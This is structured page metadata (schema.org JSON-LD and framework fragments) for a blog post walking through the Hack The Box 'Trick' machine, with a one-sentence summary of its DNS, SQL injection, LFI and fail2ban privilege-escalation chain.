12:T573,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-trick-walkthrough/#article","headline":"Hack The Box: Trick Walkthrough","description":"A DNS zone transfer revealed the payroll site, SQL injection and an LFI bypass exposed Michael's SSH key, and his writable fail2ban action directory plus restart privilege replaced the ban command with a root-owned setuid shell.","url":"https://cyberkareem.com/writing/hackthebox-trick-walkthrough/","datePublished":"2026-06-11T10:55:45.000Z","dateModified":"2026-06-11T10:55:45.000Z","wordCount":2277,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/be86ff84b680dd5b698b50da6e8f38d6dc10b594/HTB-Trick.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-trick-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-trick-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Trick Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-trick-walkthrough/"}]}]}d:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$12"}}]
e:["$","$L13",null,{"children":["$","$14",null,{"name":"Next.MetadataOutlet","children":"$@15"}]}]
15:null
